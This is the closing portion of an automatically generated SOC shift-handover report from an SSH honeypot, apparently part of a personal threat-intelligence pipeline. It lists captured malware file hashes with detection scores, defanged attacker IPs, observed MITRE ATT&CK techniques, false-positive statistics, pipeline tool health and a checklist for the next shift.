| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `156.239.224[.]79` | HK | BINARY NETWORKS SOLUTIONS LLC | **100** ⚠️ | 0 |
| `138.113.23[.]170` | US | Meteverse Limited. | **100** ⚠️ | 7 |
| `14.103.107[.]31` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `36.104.147[.]6` | CN | CHINANET Zhejiang province network | **100** ⚠️ | 50 |
| `213.55.79[.]194` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `103.250.151[.]241` | IN | Gtpl Broadband Pvt. Ltd. | **100** ⚠️ | 50 |
| `58.48.170[.]235` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |
| `185.247.137[.]168` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `115.190.54[.]120` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 26 |
| `166.62.102[.]109` | US | GoDaddy.com, LLC | **100** ⚠️ | 10 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 108 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 71 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |

---

## 🔕 False Positive Summary (38 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 35 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 174 cases |
| Tool 34  | Credential Extractor        | ✅ 98 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 38 filtered (21.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 21 recon entry/entries in table (12 group(s) consolidating 100 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-05T20:00:22Z_
